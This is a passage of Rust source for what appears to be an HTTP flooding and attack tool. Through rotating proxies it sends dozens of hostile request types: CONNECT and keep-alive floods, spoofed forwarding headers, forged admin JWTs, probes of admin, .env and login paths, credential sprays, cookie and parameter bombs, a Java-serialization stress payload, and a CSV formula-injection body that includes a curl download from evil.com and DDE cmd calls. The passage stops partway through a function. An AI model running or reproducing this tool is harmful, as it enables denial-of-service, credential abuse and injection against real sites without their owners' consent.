        let mut rng = rand::rng();
        let ranges = ["bytes=0-0,-1,0-100", "bytes=0-100,100-200,0-50,50-150", "bytes=0-500,250-750,100-300", "bytes=0-100,0-100,0-100,0-100", "bytes=-100,-200,-300", "bytes=0-0,1-1,2-2,3-3,4-4,5-5"];
        ranges[rng.random_range(0..ranges.len())]
    };
    if verbose { println!("[VERBOSE] fetch_rangeoverlap: GET {} (proxy #{}) — Range: {}", url, proxy_idx, range); }
    let resp = send_with_retry(c.get(&url).header("Range", range).header("User-Agent", "Mozilla/5.0 (compatible; RangeOverlap/1.0)"), max_retries, "fetch_rangeoverlap").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_multipost(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let body = format!("{{\"id\": {:?}, \"timestamp\": {:?}, \"data\": \"{}\"}}", rand::random::<u32>(), std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos(), "A".repeat(256));
    if verbose { println!("[VERBOSE] fetch_multipost: POST {} (proxy #{})", url, proxy_idx); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "application/json").body(body).header("User-Agent", "Mozilla/5.0 (compatible; MultiPost/1.0)"), max_retries, "fetch_multipost").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_cspreports(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let csp_report = format!(r#"{{"csp-report":{{"document-uri":"{}","referrer":"https://evil.com/","blocked-uri":"https://evil.com/evil.js","violated-directive":"script-src 'self'","original-policy":"default-src 'self'; script-src 'self';","source-file":"https://evil.com/evil.js","line-number":1,"column-number":1,"disposition":"enforce"}}}}"#, url);
    if verbose { println!("[VERBOSE] fetch_cspreports: POST {} (proxy #{}) — CSP report", url, proxy_idx); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "application/csp-report").body(csp_report).header("User-Agent", "Mozilla/5.0 (compatible; CspReport/1.0)"), max_retries, "fetch_cspreports").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_connectflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_connectflood: CONNECT {} (proxy #{})", url, proxy_idx); }
    let resp = send_with_retry(c.request(reqwest::Method::CONNECT, &url).header("User-Agent", "Mozilla/5.0 (compatible; ConnectFlood/1.0)"), max_retries, "fetch_connectflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_keepaliveflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_keepaliveflood: GET {} (proxy #{}) — Connection: keep-alive, Keep-Alive: timeout=60,max=1000", url, proxy_idx); }
    let resp = send_with_retry(c.get(&url).header("Connection", "keep-alive").header("Keep-Alive", "timeout=60, max=1000").header("User-Agent", "Mozilla/5.0 (compatible; KeepAliveFlood/1.0)"), max_retries, "fetch_keepaliveflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_linkflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_linkflood: GET {} (proxy #{}) — 6 Link headers (preload, prefetch, dns-prefetch)", url, proxy_idx); }
    let resp = send_with_retry(c.get(&url)
        .header("Link", "<https://evil.com/preload>; rel=preload; as=script")
        .header("Link", "<https://attacker.org/resource>; rel=prefetch")
        .header("Link", "<https://tracker.evil.io/track>; rel=dns-prefetch")
        .header("Link", "<https://cdn.evil.com/font>; rel=preload; as=font; crossorigin")
        .header("Link", "<https://analytics.evil.com/collect>; rel=preconnect")
        .header("Link", "<https://assets.evil.com/asset>; rel=preload; as=image")
        .header("User-Agent", "Mozilla/5.0 (compatible; LinkFlood/1.0)"), max_retries, "fetch_linkflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_forwardedflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let (xff, xfh, forwarded) = {
        let mut rng = rand::rng();
        let ips = ["192.168.1.1", "10.0.0.1", "172.16.0.1", "203.0.113.1", "198.51.100.1", "127.0.0.1", "0.0.0.0", "1.2.3.4", "185.220.101.1", "91.121.89.1"];
        let hosts = ["evil.com", "localhost", "internal.admin", "proxy.attacker.io", "hidden.service"];
        let i = rng.random_range(0..ips.len());
        let j = rng.random_range(0..hosts.len());
        let forwarded_val = format!("for={};by={};host={};proto=https", ips[rng.random_range(0..ips.len())], ips[rng.random_range(0..ips.len())], hosts[rng.random_range(0..hosts.len())]);
        (format!("{}, {}, {}", ips[i], ips[(i+1)%ips.len()], ips[(i+2)%ips.len()]), hosts[j], forwarded_val)
    };
    if verbose { println!("[VERBOSE] fetch_forwardedflood: GET {} (proxy #{}) — X-Forwarded-For: {}...", url, proxy_idx, &xff[..20]); }
    let resp = send_with_retry(c.get(&url).header("X-Forwarded-For", xff).header("X-Forwarded-Host", xfh).header("Forwarded", forwarded).header("User-Agent", "Mozilla/5.0 (compatible; ForwardedFlood/1.0)"), max_retries, "fetch_forwardedflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_healthflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const HEALTH_PATHS: &[&str] = &["/health", "/readyz", "/livez", "/healthz", "/status", "/ping", "/health/ready", "/health/live", "/api/health", "/.health", "/ready", "/statusz", "/metrics", "/healthcheck", "/api/status", "/v1/health", "/api/v1/health", "/_health", "/heartbeat", "/alive"];
    let path: &str = { let mut rng = rand::rng(); HEALTH_PATHS[rng.random_range(0..HEALTH_PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_healthflood: GET {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; HealthFlood/1.0)"), max_retries, "fetch_healthflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_jwtexplode(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let jwt = {
        let mut rng = rand::rng();
        let header = "eyJhbGciOiJSUzI1NiIsImtpZCI6InNvbWVrZXl0ZXN0LTEyMy1hYmNkIiwidHlwIjoiSldUIn0";
        let payloads = [
            &format!("eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjIsInJvbGUiOiJhZG1pbiIsInBlcm1pc3Npb25zIjpbInJlYWQiLCJ3cml0ZSIsImRlbGV0ZSJdLCJzZXNzaW9uIjoie308fXx7fXx7fSJ9")[..],
            &format!("eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwibmFtZSI6IlRlc3QgVXNlciBSZWFsbHkgTG9uZyBOYW1lIiwiYWRtaW4iOnRydWUsIm9yZyI6ImV2aWwifQ")[..],
        ];
        let sig = format!("{:032x}{:032x}{:032x}", rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>());
        format!("{}.{}.{}", header, payloads[rng.random_range(0..payloads.len())], sig)
    };
    if verbose { println!("[VERBOSE] fetch_jwtexplode: GET {} (proxy #{}) — JWT {} bytes", url, proxy_idx, jwt.len()); }
    let resp = send_with_retry(c.get(&url).header("Authorization", format!("Bearer {}", jwt)).header("User-Agent", "Mozilla/5.0 (compatible; JwtExplode/1.0)"), max_retries, "fetch_jwtexplode").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_uploadflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let boundary = format!("----UploadBoundary{:08x}", rand::random::<u32>());
    let mut body = Vec::new();
    let field_name = format!("file{}", rand::random::<u16>());
    let file_data: Vec<u8> = (0..65536).map(|_| rand::random::<u8>()).collect();
    let b64_data = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &file_data);
    body.extend_from_slice(format!("--{}\r\nContent-Disposition: form-data; name=\"{}\"; filename=\"test.bin\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\n\r\n", boundary, field_name).as_bytes());
    body.extend_from_slice(b64_data.as_bytes());
    body.extend_from_slice(format!("\r\n--{}--\r\n", boundary).as_bytes());
    if verbose { println!("[VERBOSE] fetch_uploadflood: POST {} (proxy #{}) — multipart upload {} bytes", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", format!("multipart/form-data; boundary={}", boundary)).body(body).header("User-Agent", "Mozilla/5.0 (compatible; UploadFlood/1.0)"), max_retries, "fetch_uploadflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_graphqlintrospect(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const GQL_PATHS: &[&str] = &["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query", "/api", "/api/v1"];
    let path: &str = { let mut rng = rand::rng(); GQL_PATHS[rng.random_range(0..GQL_PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    let body = r#"{"query":"query { __typename
      a0: __typename a1: __typename a2: __typename a3: __typename a4: __typename
      b0: __typename b1: __typename b2: __typename b3: __typename b4: __typename
      c0: __typename c1: __typename c2: __typename c3: __typename c4: __typename
      d0: __typename d1: __typename d2: __typename d3: __typename d4: __typename
      e0: __typename e1: __typename e2: __typename e3: __typename e4: __typename
    }","variables":null}"#;
    if verbose { println!("[VERBOSE] fetch_graphqlintrospect: POST {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.post(&target).header("Content-Type", "application/json").body(body).header("User-Agent", "Mozilla/5.0 (compatible; GraphqlIntrospect/1.0)"), max_retries, "fetch_graphqlintrospect").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_adminflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const ADMIN_PATHS: &[&str] = &["/admin", "/wp-admin", "/cpanel", "/phpmyadmin", "/console", "/manager", "/admin.php", "/administrator", "/admin/login", "/dashboard", "/backend", "/api/admin", "/admin/", "/wp-login.php", "/.env", "/config", "/config.php", "/debug", "/api/config", "/server-status"];
    let path: &str = { let mut rng = rand::rng(); ADMIN_PATHS[rng.random_range(0..ADMIN_PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_adminflood: GET {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; AdminFlood/1.0)"), max_retries, "fetch_adminflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_paramflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let param_str: String = {
                (0..120).map(|i| format!("p{}=x{:08x}y{:08x}z", i, rand::random::<u32>(), rand::random::<u32>())).collect::<Vec<_>>().join("&")
    };
    let target = format!("{}?{}&_={}", url.trim_end_matches('?'), param_str, std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos());
    if verbose { println!("[VERBOSE] fetch_paramflood: GET {} (proxy #{}) — 120+ query params", url, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; ParamFlood/1.0)"), max_retries, "fetch_paramflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_teflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let te: &str = { let mut rng = rand::rng(); ["trailers, deflate;q=0.5", "gzip, deflate;q=0.8", "trailers, gzip;q=0.3", "deflate, trailers;q=0.9", "gzip;q=1.0, trailers;q=0.5, deflate"][rng.random_range(0..5)] };
    if verbose { println!("[VERBOSE] fetch_teflood: GET {} (proxy #{}) — TE: {}", url, proxy_idx, te); }
    let resp = send_with_retry(c.get(&url).header("TE", te).header("User-Agent", "Mozilla/5.0 (compatible; TEFlood/1.0)"), max_retries, "fetch_teflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_wantdigestflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let digest: &str = { let mut rng = rand::rng(); ["SHA-256;q=1, SHA-512;q=0.5", "SHA;q=1, MD5;q=0.3, SHA-256;q=0.8", "SHA-256;q=1, SHA-512;q=1, ID-SHA-256;q=0.5", "MD5;q=1, SHA;q=0.5, SHA-256;q=0.3", "id-sha-256;q=1"][rng.random_range(0..5)] };
    if verbose { println!("[VERBOSE] fetch_wantdigestflood: GET {} (proxy #{}) — Want-Digest: {}", url, proxy_idx, digest); }
    let resp = send_with_retry(c.get(&url).header("Want-Digest", digest).header("User-Agent", "Mozilla/5.0 (compatible; WantDigestFlood/1.0)"), max_retries, "fetch_wantdigestflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_savedataflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose { println!("[VERBOSE] fetch_savedataflood: GET {} (proxy #{}) — Save-Data: on", url, proxy_idx); }
    let resp = send_with_retry(c.get(&url).header("Save-Data", "on").header("User-Agent", "Mozilla/5.0 (compatible; SaveDataFlood/1.0)"), max_retries, "fetch_savedataflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_secfetchflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let (dest, mode, site): (&str, &str, &str) = {
        let mut rng = rand::rng();
        let dests = ["document", "image", "script", "style", "font", "empty", "navigate", "worker", "sharedworker"];
        let modes = ["navigate", "same-origin", "no-cors", "cors", "websocket"];
        let sites = ["same-origin", "same-site", "cross-site", "none"];
        (dests[rng.random_range(0..dests.len())], modes[rng.random_range(0..modes.len())], sites[rng.random_range(0..sites.len())])
    };
    if verbose { println!("[VERBOSE] fetch_secfetchflood: GET {} (proxy #{}) — Sec-Fetch-Dest: {}, Mode: {}, Site: {}", url, proxy_idx, dest, mode, site); }
    let resp = send_with_retry(c.get(&url).header("Sec-Fetch-Dest", dest).header("Sec-Fetch-Mode", mode).header("Sec-Fetch-Site", site).header("Sec-Fetch-User", "?1").header("User-Agent", "Mozilla/5.0 (compatible; SecFetchFlood/1.0)"), max_retries, "fetch_secfetchflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_csvbomb(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let body = "name,email,formula\nJohn,=CMD|' /C calc'!A0,test\nJane,=HYPERLINK(\"http://evil.com\"),=DDE(\"cmd\";\"/C\";\"A1\")\nAdmin,=EXEC(\"calc\"),=MALICIOUS()\nSupport,=SHELL(\"curl http://evil.com/payload\"),test2\n";
    if verbose { println!("[VERBOSE] fetch_csvbomb: POST {} (proxy #{}) — CSV injection {} bytes", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "text/csv").body(body).header("User-Agent", "Mozilla/5.0 (compatible; CsvBomb/1.0)"), max_retries, "fetch_csvbomb").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_serializedbomb(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let magic = [0xAC, 0xED, 0x00, 0x05];
    let mut body = Vec::with_capacity(64000);
    body.extend_from_slice(&magic);
    body.extend_from_slice(&[0x73, 0x72, 0x00]); // TC_OBJECT, TC_CLASSDESC
    let classname = "com.example.VeryLongClassNameThatCausesParsingStressTest".repeat(50);
    body.extend_from_slice(&(classname.len() as u16).to_be_bytes());
    body.extend_from_slice(classname.as_bytes());
    for _ in 0..200 {
        body.push(0x74); // TC_STRING
        let s: String = { let mut rng = rand::rng(); (0..64).map(|_| (b'a' + rng.random_range(0..26)) as char).collect() };
        let bytes = s.as_bytes();
        body.extend_from_slice(&(bytes.len() as u16).to_be_bytes());
        body.extend_from_slice(bytes);
    }
    body.push(0x70); // TC_NULL
    if verbose { println!("[VERBOSE] fetch_serializedbomb: POST {} (proxy #{}) — Java serialized {} bytes", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "application/x-java-serialized-object").body(body).header("User-Agent", "Mozilla/5.0 (compatible; SerializedBomb/1.0)"), max_retries, "fetch_serializedbomb").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_wellknownflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const WK_PATHS: &[&str] = &["/.well-known/webfinger?resource=acct:admin@example.com", "/.well-known/security.txt", "/.well-known/change-password", "/.well-known/nodeinfo", "/.well-known/host-meta", "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server", "/.well-known/jwks.json", "/.well-known/apple-app-site-association", "/.well-known/assetlinks.json"];
    let path: &str = { let mut rng = rand::rng(); WK_PATHS[rng.random_range(0..WK_PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_wellknownflood: GET {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; WellKnownFlood/1.0)"), max_retries, "fetch_wellknownflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_swaggerflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const SWAGGER_PATHS: &[&str] = &["/api/docs", "/api/doc", "/swagger.json", "/swagger-ui.html", "/api/swagger", "/openapi.json", "/api/schema", "/api/v1/openapi.json", "/docs", "/api/", "/apidocs", "/api/v1/"];
    let path: &str = { let mut rng = rand::rng(); SWAGGER_PATHS[rng.random_range(0..SWAGGER_PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_swaggerflood: GET {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("Accept", "application/json, text/html, */*").header("User-Agent", "Mozilla/5.0 (compatible; SwaggerFlood/1.0)"), max_retries, "fetch_swaggerflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_loginflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const LOGIN_PATHS: &[&str] = &["/login", "/signin", "/auth", "/api/login", "/api/auth", "/oauth/token", "/oauth/authorize", "/api/v1/auth", "/user/login", "/account/login", "/api/v1/login", "/auth/login"];
    let path: &str = { let mut rng = rand::rng(); LOGIN_PATHS[rng.random_range(0..LOGIN_PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    let creds = format!("username=admin{:04}&password=Test123!&submit=Login", rand::random::<u16>());
    if verbose { println!("[VERBOSE] fetch_loginflood: POST {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.post(&target).header("Content-Type", "application/x-www-form-urlencoded").body(creds).header("User-Agent", "Mozilla/5.0 (compatible; LoginFlood/1.0)"), max_retries, "fetch_loginflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

pub(crate) async fn fetch_methodoverrideflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let method: &str = { let mut rng = rand::rng(); ["PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT", "PROPFIND", "MOVE", "COPY", "MKCOL"][rng.random_range(0..10)] };
    if verbose { println!("[VERBOSE] fetch_methodoverrideflood: POST {} (proxy #{}) — X-HTTP-Method-Override: {}", url, proxy_idx, method); }
    let resp = send_with_retry(c.post(&url).header("X-HTTP-Method-Override", method).header("X-HTTP-Method", method).header("X-Method-Override", method).header("User-Agent", "Mozilla/5.0 (compatible; MethodOverrideFlood/1.0)"), max_retries, "fetch_methodoverrideflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}


/// CookieBomb2: 10 cookies with 4KB values each (header size stress)
pub(crate) async fn fetch_cookiebomb2(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let cookie_val: String = { let mut rng = rand::rng(); (0..4096).map(|_| (b'a' + rng.random_range(0..26)) as char).collect() };
    let mut builder = c.get(&url);
    for i in 0..10 {
        builder = builder.header("Cookie", format!("bigcookie{}=x{}x", i, &cookie_val[..4000]));
    }
    if verbose { println!("[VERBOSE] fetch_cookiebomb2: GET {} (proxy #{}) — 10 x 4KB cookies", url, proxy_idx); }
    let resp = send_with_retry(builder.header("User-Agent", "Mozilla/5.0 (compatible; CookieBomb2/1.0)"), max_retries, "fetch_cookiebomb2").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// GraphqlBatch: POST batch GraphQL queries
pub(crate) async fn fetch_graphqlbatch(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let mut body = String::from("[");
    for i in 0..50 {
        if i > 0 { body.push_str(","); }
        body.push_str(&format!(r#"{{"query":"query q{} {{ __typename }}","variables":{{}}}}"#, i));
    }
    body.push_str("]");
    if verbose { println!("[VERBOSE] fetch_graphqlbatch: POST {} (proxy #{}) — 50 batched queries, {} bytes", url, proxy_idx, body.len()); }
    let resp = send_with_retry(c.post(&url).header("Content-Type", "application/json").body(body).header("User-Agent", "Mozilla/5.0 (compatible; GraphqlBatch/1.0)"), max_retries, "fetch_graphqlbatch").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// WebhookFlood: probe webhook/callback/hook endpoints
pub(crate) async fn fetch_webhookflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const PATHS: &[&str] = &["/webhook", "/webhooks", "/hooks", "/hook", "/api/webhook", "/api/hooks", "/callback", "/api/callback", "/event", "/events", "/notify", "/notification", "/api/notify", "/alert", "/alerts", "/api/alert"];
    let path: &str = { let mut rng = rand::rng(); PATHS[rng.random_range(0..PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    let body = format!(r#"{{"event":"test","data":"probe-{:08x}","source":"simulate-load"}}"#, rand::random::<u32>());
    if verbose { println!("[VERBOSE] fetch_webhookflood: POST {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.post(&target).header("Content-Type", "application/json").body(body).header("User-Agent", "Mozilla/5.0 (compatible; WebhookFlood/1.0)"), max_retries, "fetch_webhookflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// ApiVersionFlood: probe API version paths
pub(crate) async fn fetch_apiversionflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
